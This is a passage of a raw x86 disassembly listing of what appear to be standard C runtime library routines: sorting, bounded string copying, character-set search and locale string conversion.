  408ae4:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408aea:	83 c4 08             	add    $0x8,%esp
  408aed:	85 c0                	test   %eax,%eax
  408aef:	7e d3                	jle    0x408ac4
  408af1:	3b de                	cmp    %esi,%ebx
  408af3:	77 3d                	ja     0x408b32
  408af5:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  408afb:	8b bd 00 ff ff ff    	mov    -0x100(%ebp),%edi
  408b01:	03 f2                	add    %edx,%esi
  408b03:	3b f0                	cmp    %eax,%esi
  408b05:	77 1f                	ja     0x408b26
  408b07:	53                   	push   %ebx
  408b08:	56                   	push   %esi
  408b09:	8b cf                	mov    %edi,%ecx
  408b0b:	ff 15 3c d1 40 00    	call   *0x40d13c
  408b11:	ff d7                	call   *%edi
  408b13:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408b19:	83 c4 08             	add    $0x8,%esp
  408b1c:	85 c0                	test   %eax,%eax
  408b1e:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  408b24:	7e db                	jle    0x408b01
  408b26:	8b bd ec fe ff ff    	mov    -0x114(%ebp),%edi
  408b2c:	89 b5 f4 fe ff ff    	mov    %esi,-0x10c(%ebp)
  408b32:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  408b38:	eb 06                	jmp    0x408b40
  408b3a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  408b40:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408b46:	2b fa                	sub    %edx,%edi
  408b48:	3b fb                	cmp    %ebx,%edi
  408b4a:	76 19                	jbe    0x408b65
  408b4c:	53                   	push   %ebx
  408b4d:	57                   	push   %edi
  408b4e:	8b ce                	mov    %esi,%ecx
  408b50:	ff 15 3c d1 40 00    	call   *0x40d13c
  408b56:	ff d6                	call   *%esi
  408b58:	83 c4 08             	add    $0x8,%esp
  408b5b:	85 c0                	test   %eax,%eax
  408b5d:	7f e1                	jg     0x408b40
  408b5f:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408b65:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  408b6b:	89 bd ec fe ff ff    	mov    %edi,-0x114(%ebp)
  408b71:	3b fe                	cmp    %esi,%edi
  408b73:	72 5e                	jb     0x408bd3
  408b75:	89 95 e8 fe ff ff    	mov    %edx,-0x118(%ebp)
  408b7b:	89 bd e4 fe ff ff    	mov    %edi,-0x11c(%ebp)
  408b81:	3b f7                	cmp    %edi,%esi
  408b83:	74 33                	je     0x408bb8
  408b85:	8b de                	mov    %esi,%ebx
  408b87:	8b d7                	mov    %edi,%edx
  408b89:	8b b5 e8 fe ff ff    	mov    -0x118(%ebp),%esi
  408b8f:	2b df                	sub    %edi,%ebx
  408b91:	8a 02                	mov    (%edx),%al
  408b93:	8d 52 01             	lea    0x1(%edx),%edx
  408b96:	8a 4c 13 ff          	mov    -0x1(%ebx,%edx,1),%cl
  408b9a:	88 44 13 ff          	mov    %al,-0x1(%ebx,%edx,1)
  408b9e:	88 4a ff             	mov    %cl,-0x1(%edx)
  408ba1:	83 ee 01             	sub    $0x1,%esi
  408ba4:	75 eb                	jne    0x408b91
  408ba6:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  408bac:	8b 9d f0 fe ff ff    	mov    -0x110(%ebp),%ebx
  408bb2:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408bb8:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  408bbe:	3b df                	cmp    %edi,%ebx
  408bc0:	0f 85 fa fe ff ff    	jne    0x408ac0
  408bc6:	8b de                	mov    %esi,%ebx
  408bc8:	89 9d f0 fe ff ff    	mov    %ebx,-0x110(%ebp)
  408bce:	e9 ed fe ff ff       	jmp    0x408ac0
  408bd3:	03 fa                	add    %edx,%edi
  408bd5:	3b df                	cmp    %edi,%ebx
  408bd7:	73 32                	jae    0x408c0b
  408bd9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  408be0:	2b fa                	sub    %edx,%edi
  408be2:	3b fb                	cmp    %ebx,%edi
  408be4:	76 25                	jbe    0x408c0b
  408be6:	8b 8d 00 ff ff ff    	mov    -0x100(%ebp),%ecx
  408bec:	53                   	push   %ebx
  408bed:	57                   	push   %edi
  408bee:	ff 15 3c d1 40 00    	call   *0x40d13c
  408bf4:	ff 95 00 ff ff ff    	call   *-0x100(%ebp)
  408bfa:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408c00:	83 c4 08             	add    $0x8,%esp
  408c03:	85 c0                	test   %eax,%eax
  408c05:	74 d9                	je     0x408be0
  408c07:	3b df                	cmp    %edi,%ebx
  408c09:	72 2f                	jb     0x408c3a
  408c0b:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  408c11:	2b fa                	sub    %edx,%edi
  408c13:	3b bd fc fe ff ff    	cmp    -0x104(%ebp),%edi
  408c19:	76 19                	jbe    0x408c34
  408c1b:	53                   	push   %ebx
  408c1c:	57                   	push   %edi
  408c1d:	8b ce                	mov    %esi,%ecx
  408c1f:	ff 15 3c d1 40 00    	call   *0x40d13c
  408c25:	ff d6                	call   *%esi
  408c27:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  408c2d:	83 c4 08             	add    $0x8,%esp
  408c30:	85 c0                	test   %eax,%eax
  408c32:	74 dd                	je     0x408c11
  408c34:	8b b5 f4 fe ff ff    	mov    -0x10c(%ebp),%esi
  408c3a:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  408c40:	8b c7                	mov    %edi,%eax
  408c42:	8b 9d fc fe ff ff    	mov    -0x104(%ebp),%ebx
  408c48:	8b ca                	mov    %edx,%ecx
  408c4a:	2b ce                	sub    %esi,%ecx
  408c4c:	2b c3                	sub    %ebx,%eax
  408c4e:	3b c1                	cmp    %ecx,%eax
  408c50:	7c 39                	jl     0x408c8b
  408c52:	3b df                	cmp    %edi,%ebx
  408c54:	73 18                	jae    0x408c6e
  408c56:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  408c5c:	89 9c 85 0c ff ff ff 	mov    %ebx,-0xf4(%ebp,%eax,4)
  408c63:	89 7c 85 84          	mov    %edi,-0x7c(%ebp,%eax,4)
  408c67:	40                   	inc    %eax
  408c68:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  408c6e:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  408c74:	3b f2                	cmp    %edx,%esi
  408c76:	73 4c                	jae    0x408cc4
  408c78:	8b ce                	mov    %esi,%ecx
  408c7a:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  408c80:	89 8d fc fe ff ff    	mov    %ecx,-0x104(%ebp)
  408c86:	e9 6a fd ff ff       	jmp    0x4089f5
  408c8b:	3b f2                	cmp    %edx,%esi
  408c8d:	73 18                	jae    0x408ca7
  408c8f:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  408c95:	89 b4 85 0c ff ff ff 	mov    %esi,-0xf4(%ebp,%eax,4)
  408c9c:	89 54 85 84          	mov    %edx,-0x7c(%ebp,%eax,4)
  408ca0:	40                   	inc    %eax
  408ca1:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  408ca7:	8b 8d fc fe ff ff    	mov    -0x104(%ebp),%ecx
  408cad:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  408cb3:	3b cf                	cmp    %edi,%ecx
  408cb5:	73 15                	jae    0x408ccc
  408cb7:	8b d7                	mov    %edi,%edx
  408cb9:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  408cbf:	e9 2b fd ff ff       	jmp    0x4089ef
  408cc4:	8b b5 00 ff ff ff    	mov    -0x100(%ebp),%esi
  408cca:	eb 06                	jmp    0x408cd2
  408ccc:	8b bd 04 ff ff ff    	mov    -0xfc(%ebp),%edi
  408cd2:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
  408cd8:	83 e8 01             	sub    $0x1,%eax
  408cdb:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  408ce1:	78 16                	js     0x408cf9
  408ce3:	8b 8c 85 0c ff ff ff 	mov    -0xf4(%ebp,%eax,4),%ecx
  408cea:	8b 54 85 84          	mov    -0x7c(%ebp,%eax,4),%edx
  408cee:	89 8d fc fe ff ff    	mov    %ecx,-0x104(%ebp)
  408cf4:	e9 f6 fc ff ff       	jmp    0x4089ef
  408cf9:	5b                   	pop    %ebx
  408cfa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408cfd:	5f                   	pop    %edi
  408cfe:	33 cd                	xor    %ebp,%ecx
  408d00:	5e                   	pop    %esi
  408d01:	e8 58 85 ff ff       	call   0x40125e
  408d06:	8b e5                	mov    %ebp,%esp
  408d08:	5d                   	pop    %ebp
  408d09:	c3                   	ret
  408d0a:	8b ff                	mov    %edi,%edi
  408d0c:	55                   	push   %ebp
  408d0d:	8b ec                	mov    %esp,%ebp
  408d0f:	51                   	push   %ecx
  408d10:	8b 55 14             	mov    0x14(%ebp),%edx
  408d13:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408d16:	56                   	push   %esi
  408d17:	85 d2                	test   %edx,%edx
  408d19:	75 0d                	jne    0x408d28
  408d1b:	85 c9                	test   %ecx,%ecx
  408d1d:	75 0d                	jne    0x408d2c
  408d1f:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  408d22:	75 21                	jne    0x408d45
  408d24:	33 c0                	xor    %eax,%eax
  408d26:	eb 2e                	jmp    0x408d56
  408d28:	85 c9                	test   %ecx,%ecx
  408d2a:	74 19                	je     0x408d45
  408d2c:	8b 45 0c             	mov    0xc(%ebp),%eax
  408d2f:	85 c0                	test   %eax,%eax
  408d31:	74 12                	je     0x408d45
  408d33:	85 d2                	test   %edx,%edx
  408d35:	75 04                	jne    0x408d3b
  408d37:	88 11                	mov    %dl,(%ecx)
  408d39:	eb e9                	jmp    0x408d24
  408d3b:	8b 75 10             	mov    0x10(%ebp),%esi
  408d3e:	85 f6                	test   %esi,%esi
  408d40:	75 19                	jne    0x408d5b
  408d42:	c6 01 00             	movb   $0x0,(%ecx)
  408d45:	e8 af ce ff ff       	call   0x405bf9
  408d4a:	6a 16                	push   $0x16
  408d4c:	5e                   	pop    %esi
  408d4d:	89 30                	mov    %esi,(%eax)
  408d4f:	e8 e9 cd ff ff       	call   0x405b3d
  408d54:	8b c6                	mov    %esi,%eax
  408d56:	5e                   	pop    %esi
  408d57:	8b e5                	mov    %ebp,%esp
  408d59:	5d                   	pop    %ebp
  408d5a:	c3                   	ret
  408d5b:	53                   	push   %ebx
  408d5c:	2b f1                	sub    %ecx,%esi
  408d5e:	8b d8                	mov    %eax,%ebx
  408d60:	57                   	push   %edi
  408d61:	8b f9                	mov    %ecx,%edi
  408d63:	83 fa ff             	cmp    $0xffffffff,%edx
  408d66:	75 11                	jne    0x408d79
  408d68:	8a 04 3e             	mov    (%esi,%edi,1),%al
  408d6b:	88 07                	mov    %al,(%edi)
  408d6d:	47                   	inc    %edi
  408d6e:	84 c0                	test   %al,%al
  408d70:	74 25                	je     0x408d97
  408d72:	83 eb 01             	sub    $0x1,%ebx
  408d75:	75 f1                	jne    0x408d68
  408d77:	eb 1e                	jmp    0x408d97
  408d79:	8a 04 3e             	mov    (%esi,%edi,1),%al
  408d7c:	88 07                	mov    %al,(%edi)
  408d7e:	47                   	inc    %edi
  408d7f:	84 c0                	test   %al,%al
  408d81:	74 0a                	je     0x408d8d
  408d83:	83 eb 01             	sub    $0x1,%ebx
  408d86:	74 05                	je     0x408d8d
  408d88:	83 ea 01             	sub    $0x1,%edx
  408d8b:	75 ec                	jne    0x408d79
  408d8d:	85 d2                	test   %edx,%edx
  408d8f:	8b 55 14             	mov    0x14(%ebp),%edx
  408d92:	75 03                	jne    0x408d97
  408d94:	c6 07 00             	movb   $0x0,(%edi)
  408d97:	5f                   	pop    %edi
  408d98:	85 db                	test   %ebx,%ebx
  408d9a:	5b                   	pop    %ebx
  408d9b:	75 87                	jne    0x408d24
  408d9d:	83 fa ff             	cmp    $0xffffffff,%edx
  408da0:	75 0d                	jne    0x408daf
  408da2:	8b 45 0c             	mov    0xc(%ebp),%eax
  408da5:	6a 50                	push   $0x50
  408da7:	c6 44 01 ff 00       	movb   $0x0,-0x1(%ecx,%eax,1)
  408dac:	58                   	pop    %eax
  408dad:	eb a7                	jmp    0x408d56
  408daf:	c6 01 00             	movb   $0x0,(%ecx)
  408db2:	e8 42 ce ff ff       	call   0x405bf9
  408db7:	6a 22                	push   $0x22
  408db9:	eb 91                	jmp    0x408d4c
  408dbb:	8b ff                	mov    %edi,%edi
  408dbd:	55                   	push   %ebp
  408dbe:	8b ec                	mov    %esp,%ebp
  408dc0:	5d                   	pop    %ebp
  408dc1:	e9 44 ff ff ff       	jmp    0x408d0a
  408dc6:	cc                   	int3
  408dc7:	cc                   	int3
  408dc8:	cc                   	int3
  408dc9:	cc                   	int3
  408dca:	cc                   	int3
  408dcb:	cc                   	int3
  408dcc:	cc                   	int3
  408dcd:	cc                   	int3
  408dce:	cc                   	int3
  408dcf:	cc                   	int3
  408dd0:	55                   	push   %ebp
  408dd1:	8b ec                	mov    %esp,%ebp
  408dd3:	56                   	push   %esi
  408dd4:	33 c0                	xor    %eax,%eax
  408dd6:	50                   	push   %eax
  408dd7:	50                   	push   %eax
  408dd8:	50                   	push   %eax
  408dd9:	50                   	push   %eax
  408dda:	50                   	push   %eax
  408ddb:	50                   	push   %eax
  408ddc:	50                   	push   %eax
  408ddd:	50                   	push   %eax
  408dde:	8b 55 0c             	mov    0xc(%ebp),%edx
  408de1:	8d 49 00             	lea    0x0(%ecx),%ecx
  408de4:	8a 02                	mov    (%edx),%al
  408de6:	0a c0                	or     %al,%al
  408de8:	74 09                	je     0x408df3
  408dea:	83 c2 01             	add    $0x1,%edx
  408ded:	0f ab 04 24          	bts    %eax,(%esp)
  408df1:	eb f1                	jmp    0x408de4
  408df3:	8b 75 08             	mov    0x8(%ebp),%esi
  408df6:	8b ff                	mov    %edi,%edi
  408df8:	8a 06                	mov    (%esi),%al
  408dfa:	0a c0                	or     %al,%al
  408dfc:	74 0c                	je     0x408e0a
  408dfe:	83 c6 01             	add    $0x1,%esi
  408e01:	0f a3 04 24          	bt     %eax,(%esp)
  408e05:	73 f1                	jae    0x408df8
  408e07:	8d 46 ff             	lea    -0x1(%esi),%eax
  408e0a:	83 c4 20             	add    $0x20,%esp
  408e0d:	5e                   	pop    %esi
  408e0e:	c9                   	leave
  408e0f:	c3                   	ret
  408e10:	8b ff                	mov    %edi,%edi
  408e12:	55                   	push   %ebp
  408e13:	8b ec                	mov    %esp,%ebp
  408e15:	6a 00                	push   $0x0
  408e17:	ff 75 0c             	push   0xc(%ebp)
  408e1a:	ff 75 08             	push   0x8(%ebp)
  408e1d:	e8 05 00 00 00       	call   0x408e27
  408e22:	83 c4 0c             	add    $0xc,%esp
  408e25:	5d                   	pop    %ebp
  408e26:	c3                   	ret
  408e27:	8b ff                	mov    %edi,%edi
  408e29:	55                   	push   %ebp
  408e2a:	8b ec                	mov    %esp,%ebp
  408e2c:	83 ec 10             	sub    $0x10,%esp
  408e2f:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  408e33:	75 14                	jne    0x408e49
  408e35:	e8 bf cd ff ff       	call   0x405bf9
  408e3a:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408e40:	e8 f8 cc ff ff       	call   0x405b3d
  408e45:	33 c0                	xor    %eax,%eax
  408e47:	eb 67                	jmp    0x408eb0
  408e49:	56                   	push   %esi
  408e4a:	8b 75 0c             	mov    0xc(%ebp),%esi
  408e4d:	85 f6                	test   %esi,%esi
  408e4f:	75 12                	jne    0x408e63
  408e51:	e8 a3 cd ff ff       	call   0x405bf9
  408e56:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408e5c:	e8 dc cc ff ff       	call   0x405b3d
  408e61:	eb 05                	jmp    0x408e68
  408e63:	39 75 08             	cmp    %esi,0x8(%ebp)
  408e66:	72 04                	jb     0x408e6c
  408e68:	33 c0                	xor    %eax,%eax
  408e6a:	eb 43                	jmp    0x408eaf
  408e6c:	ff 75 10             	push   0x10(%ebp)
  408e6f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408e72:	e8 06 c5 ff ff       	call   0x40537d
  408e77:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408e7a:	83 7a 08 00          	cmpl   $0x0,0x8(%edx)
  408e7e:	74 1c                	je     0x408e9c
  408e80:	8d 4e ff             	lea    -0x1(%esi),%ecx
  408e83:	49                   	dec    %ecx
  408e84:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  408e87:	77 0a                	ja     0x408e93
  408e89:	0f b6 01             	movzbl (%ecx),%eax
  408e8c:	f6 44 10 19 04       	testb  $0x4,0x19(%eax,%edx,1)
  408e91:	75 f0                	jne    0x408e83
  408e93:	8b c6                	mov    %esi,%eax
  408e95:	2b c1                	sub    %ecx,%eax
  408e97:	83 e0 01             	and    $0x1,%eax
  408e9a:	2b f0                	sub    %eax,%esi
  408e9c:	4e                   	dec    %esi
  408e9d:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  408ea1:	74 0a                	je     0x408ead
  408ea3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408ea6:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  408ead:	8b c6                	mov    %esi,%eax
  408eaf:	5e                   	pop    %esi
  408eb0:	8b e5                	mov    %ebp,%esp
  408eb2:	5d                   	pop    %ebp
  408eb3:	c3                   	ret
  408eb4:	8b ff                	mov    %edi,%edi
  408eb6:	55                   	push   %ebp
  408eb7:	8b ec                	mov    %esp,%ebp
  408eb9:	51                   	push   %ecx
  408eba:	51                   	push   %ecx
  408ebb:	a1 00 40 41 00       	mov    0x414000,%eax
  408ec0:	33 c5                	xor    %ebp,%eax
  408ec2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408ec5:	53                   	push   %ebx
  408ec6:	56                   	push   %esi
  408ec7:	8b 75 18             	mov    0x18(%ebp),%esi
  408eca:	57                   	push   %edi
  408ecb:	85 f6                	test   %esi,%esi
  408ecd:	7e 14                	jle    0x408ee3
  408ecf:	56                   	push   %esi
  408ed0:	ff 75 14             	push   0x14(%ebp)
  408ed3:	e8 f4 07 00 00       	call   0x4096cc
  408ed8:	59                   	pop    %ecx
  408ed9:	3b c6                	cmp    %esi,%eax
  408edb:	59                   	pop    %ecx
  408edc:	8d 70 01             	lea    0x1(%eax),%esi
  408edf:	7c 02                	jl     0x408ee3
  408ee1:	8b f0                	mov    %eax,%esi
  408ee3:	8b 7d 24             	mov    0x24(%ebp),%edi
  408ee6:	85 ff                	test   %edi,%edi
  408ee8:	75 0b                	jne    0x408ef5
  408eea:	8b 45 08             	mov    0x8(%ebp),%eax
  408eed:	8b 00                	mov    (%eax),%eax
  408eef:	8b 78 08             	mov    0x8(%eax),%edi
  408ef2:	89 7d 24             	mov    %edi,0x24(%ebp)
  408ef5:	33 c0                	xor    %eax,%eax
  408ef7:	39 45 28             	cmp    %eax,0x28(%ebp)
  408efa:	6a 00                	push   $0x0
  408efc:	6a 00                	push   $0x0
  408efe:	56                   	push   %esi
  408eff:	ff 75 14             	push   0x14(%ebp)
  408f02:	0f 95 c0             	setne  %al
  408f05:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  408f0c:	50                   	push   %eax
  408f0d:	57                   	push   %edi
  408f0e:	ff 15 b8 d0 40 00    	call   *0x40d0b8
  408f14:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408f17:	85 c0                	test   %eax,%eax
  408f19:	0f 84 8d 01 00 00    	je     0x4090ac
  408f1f:	8d 14 00             	lea    (%eax,%eax,1),%edx
  408f22:	8d 4a 08             	lea    0x8(%edx),%ecx
  408f25:	3b d1                	cmp    %ecx,%edx
  408f27:	1b c0                	sbb    %eax,%eax
  408f29:	85 c1                	test   %eax,%ecx
  408f2b:	74 52                	je     0x408f7f
  408f2d:	8d 4a 08             	lea    0x8(%edx),%ecx
  408f30:	3b d1                	cmp    %ecx,%edx
  408f32:	1b c0                	sbb    %eax,%eax
  408f34:	23 c1                	and    %ecx,%eax
  408f36:	8d 4a 08             	lea    0x8(%edx),%ecx
  408f39:	3d 00 04 00 00       	cmp    $0x400,%eax
  408f3e:	77 1d                	ja     0x408f5d
  408f40:	3b d1                	cmp    %ecx,%edx
  408f42:	1b c0                	sbb    %eax,%eax
  408f44:	23 c1                	and    %ecx,%eax
  408f46:	e8 35 31 00 00       	call   0x40c080
  408f4b:	8b dc                	mov    %esp,%ebx
  408f4d:	85 db                	test   %ebx,%ebx
  408f4f:	0f 84 4c 01 00 00    	je     0x4090a1
  408f55:	c7 03 cc cc 00 00    	movl   $0xcccc,(%ebx)
  408f5b:	eb 1d                	jmp    0x408f7a
  408f5d:	3b d1                	cmp    %ecx,%edx
  408f5f:	1b c0                	sbb    %eax,%eax
  408f61:	23 c1                	and    %ecx,%eax
  408f63:	50                   	push   %eax
  408f64:	e8 96 e7 ff ff       	call   0x4076ff
  408f69:	8b d8                	mov    %eax,%ebx
  408f6b:	59                   	pop    %ecx
  408f6c:	85 db                	test   %ebx,%ebx
  408f6e:	0f 84 2d 01 00 00    	je     0x4090a1
  408f74:	c7 03 dd dd 00 00    	movl   $0xdddd,(%ebx)
  408f7a:	83 c3 08             	add    $0x8,%ebx
  408f7d:	eb 02                	jmp    0x408f81
  408f7f:	33 db                	xor    %ebx,%ebx
  408f81:	85 db                	test   %ebx,%ebx
  408f83:	0f 84 18 01 00 00    	je     0x4090a1
  408f89:	ff 75 f8             	push   -0x8(%ebp)
  408f8c:	53                   	push   %ebx
  408f8d:	56                   	push   %esi
  408f8e:	ff 75 14             	push   0x14(%ebp)
  408f91:	6a 01                	push   $0x1
  408f93:	57                   	push   %edi
  408f94:	ff 15 b8 d0 40 00    	call   *0x40d0b8
  408f9a:	85 c0                	test   %eax,%eax
  408f9c:	0f 84 ff 00 00 00    	je     0x4090a1
  408fa2:	8b 7d f8             	mov    -0x8(%ebp),%edi
  408fa5:	33 c0                	xor    %eax,%eax
  408fa7:	50                   	push   %eax
  408fa8:	50                   	push   %eax
  408fa9:	50                   	push   %eax
  408faa:	50                   	push   %eax
  408fab:	50                   	push   %eax
  408fac:	57                   	push   %edi
  408fad:	53                   	push   %ebx
  408fae:	ff 75 10             	push   0x10(%ebp)
  408fb1:	ff 75 0c             	push   0xc(%ebp)
  408fb4:	e8 5c de ff ff       	call   0x406e15
  408fb9:	8b f0                	mov    %eax,%esi
  408fbb:	85 f6                	test   %esi,%esi
  408fbd:	0f 84 de 00 00 00    	je     0x4090a1
  408fc3:	f7 45 10 00 04 00 00 	testl  $0x400,0x10(%ebp)
  408fca:	74 38                	je     0x409004
  408fcc:	8b 45 20             	mov    0x20(%ebp),%eax
  408fcf:	85 c0                	test   %eax,%eax
  408fd1:	0f 84 cc 00 00 00    	je     0x4090a3
  408fd7:	3b f0                	cmp    %eax,%esi
  408fd9:	0f 8f c2 00 00 00    	jg     0x4090a1
  408fdf:	33 c9                	xor    %ecx,%ecx
  408fe1:	51                   	push   %ecx
  408fe2:	51                   	push   %ecx
  408fe3:	51                   	push   %ecx
  408fe4:	50                   	push   %eax
  408fe5:	ff 75 1c             	push   0x1c(%ebp)
  408fe8:	57                   	push   %edi
  408fe9:	53                   	push   %ebx
  408fea:	ff 75 10             	push   0x10(%ebp)
  408fed:	ff 75 0c             	push   0xc(%ebp)
  408ff0:	e8 20 de ff ff       	call   0x406e15
  408ff5:	8b f0                	mov    %eax,%esi
  408ff7:	85 f6                	test   %esi,%esi
  408ff9:	0f 85 a4 00 00 00    	jne    0x4090a3
  408fff:	e9 9d 00 00 00       	jmp    0x4090a1
  409004:	8d 14 36             	lea    (%esi,%esi,1),%edx
  409007:	8d 4a 08             	lea    0x8(%edx),%ecx
  40900a:	3b d1                	cmp    %ecx,%edx
  40900c:	1b c0                	sbb    %eax,%eax
  40900e:	85 c1                	test   %eax,%ecx
  409010:	74 4a                	je     0x40905c
  409012:	8d 4a 08             	lea    0x8(%edx),%ecx
  409015:	3b d1                	cmp    %ecx,%edx
  409017:	1b c0                	sbb    %eax,%eax
  409019:	23 c1                	and    %ecx,%eax
  40901b:	8d 4a 08             	lea    0x8(%edx),%ecx
  40901e:	3d 00 04 00 00       	cmp    $0x400,%eax
  409023:	77 19                	ja     0x40903e
  409025:	3b d1                	cmp    %ecx,%edx
  409027:	1b c0                	sbb    %eax,%eax
  409029:	23 c1                	and    %ecx,%eax
  40902b:	e8 50 30 00 00       	call   0x40c080
  409030:	8b fc                	mov    %esp,%edi
  409032:	85 ff                	test   %edi,%edi
  409034:	74 64                	je     0x40909a
  409036:	c7 07 cc cc 00 00    	movl   $0xcccc,(%edi)
  40903c:	eb 19                	jmp    0x409057
  40903e:	3b d1                	cmp    %ecx,%edx
  409040:	1b c0                	sbb    %eax,%eax
  409042:	23 c1                	and    %ecx,%eax
  409044:	50                   	push   %eax
  409045:	e8 b5 e6 ff ff       	call   0x4076ff
  40904a:	8b f8                	mov    %eax,%edi
  40904c:	59                   	pop    %ecx
  40904d:	85 ff                	test   %edi,%edi
  40904f:	74 49                	je     0x40909a
  409051:	c7 07 dd dd 00 00    	movl   $0xdddd,(%edi)
  409057:	83 c7 08             	add    $0x8,%edi
  40905a:	eb 02                	jmp    0x40905e
  40905c:	33 ff                	xor    %edi,%edi
  40905e:	85 ff                	test   %edi,%edi
  409060:	74 38                	je     0x40909a
  409062:	6a 00                	push   $0x0
  409064:	6a 00                	push   $0x0
  409066:	6a 00                	push   $0x0
  409068:	56                   	push   %esi
  409069:	57                   	push   %edi
  40906a:	ff 75 f8             	push   -0x8(%ebp)
  40906d:	53                   	push   %ebx
  40906e:	ff 75 10             	push   0x10(%ebp)
  409071:	ff 75 0c             	push   0xc(%ebp)
  409074:	e8 9c dd ff ff       	call   0x406e15
  409079:	85 c0                	test   %eax,%eax
  40907b:	74 1d                	je     0x40909a
  40907d:	33 c0                	xor    %eax,%eax
  40907f:	50                   	push   %eax
  409080:	50                   	push   %eax
  409081:	39 45 20             	cmp    %eax,0x20(%ebp)
  409084:	75 3a                	jne    0x4090c0
  409086:	50                   	push   %eax
  409087:	50                   	push   %eax
  409088:	56                   	push   %esi
  409089:	57                   	push   %edi
  40908a:	50                   	push   %eax
  40908b:	ff 75 24             	push   0x24(%ebp)
  40908e:	ff 15 bc d0 40 00    	call   *0x40d0bc
  409094:	8b f0                	mov    %eax,%esi
  409096:	85 f6                	test   %esi,%esi
  409098:	75 2e                	jne    0x4090c8
  40909a:	57                   	push   %edi
  40909b:	e8 ca e7 ff ff       	call   0x40786a
  4090a0:	59                   	pop    %ecx
  4090a1:	33 f6                	xor    %esi,%esi
  4090a3:	53                   	push   %ebx
  4090a4:	e8 c1 e7 ff ff       	call   0x40786a
  4090a9:	59                   	pop    %ecx
  4090aa:	8b c6                	mov    %esi,%eax
  4090ac:	8d 65 ec             	lea    -0x14(%ebp),%esp
  4090af:	5f                   	pop    %edi
  4090b0:	5e                   	pop    %esi
  4090b1:	5b                   	pop    %ebx
  4090b2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4090b5:	33 cd                	xor    %ebp,%ecx
  4090b7:	e8 a2 81 ff ff       	call   0x40125e
  4090bc:	8b e5                	mov    %ebp,%esp
  4090be:	5d                   	pop    %ebp
  4090bf:	c3                   	ret
  4090c0:	ff 75 20             	push   0x20(%ebp)
  4090c3:	ff 75 1c             	push   0x1c(%ebp)
  4090c6:	eb c0                	jmp    0x409088
  4090c8:	57                   	push   %edi
  4090c9:	e8 9c e7 ff ff       	call   0x40786a
  4090ce:	59                   	pop    %ecx
  4090cf:	eb d2                	jmp    0x4090a3
  4090d1:	8b ff                	mov    %edi,%edi
  4090d3:	55                   	push   %ebp
  4090d4:	8b ec                	mov    %esp,%ebp
  4090d6:	83 ec 10             	sub    $0x10,%esp
  4090d9:	ff 75 08             	push   0x8(%ebp)
  4090dc:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4090df:	e8 99 c2 ff ff       	call   0x40537d
  4090e4:	ff 75 28             	push   0x28(%ebp)
  4090e7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4090ea:	ff 75 24             	push   0x24(%ebp)
  4090ed:	ff 75 20             	push   0x20(%ebp)
  4090f0:	ff 75 1c             	push   0x1c(%ebp)
  4090f3:	ff 75 18             	push   0x18(%ebp)
  4090f6:	ff 75 14             	push   0x14(%ebp)
  4090f9:	ff 75 10             	push   0x10(%ebp)
  4090fc:	ff 75 0c             	push   0xc(%ebp)
  4090ff:	50                   	push   %eax
  409100:	e8 af fd ff ff       	call   0x408eb4
  409105:	83 c4 24             	add    $0x24,%esp
  409108:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  40910c:	74 0a                	je     0x409118
  40910e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  409111:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  409118:	8b e5                	mov    %ebp,%esp
  40911a:	5d                   	pop    %ebp
  40911b:	c3                   	ret
  40911c:	e8 0a d5 ff ff       	call   0x40662b
  409121:	33 c9                	xor    %ecx,%ecx
  409123:	84 c0                	test   %al,%al
  409125:	0f 94 c1             	sete   %cl
  409128:	8b c1                	mov    %ecx,%eax
  40912a:	c3                   	ret
  40912b:	8b ff                	mov    %edi,%edi
  40912d:	55                   	push   %ebp
  40912e:	8b ec                	mov    %esp,%ebp
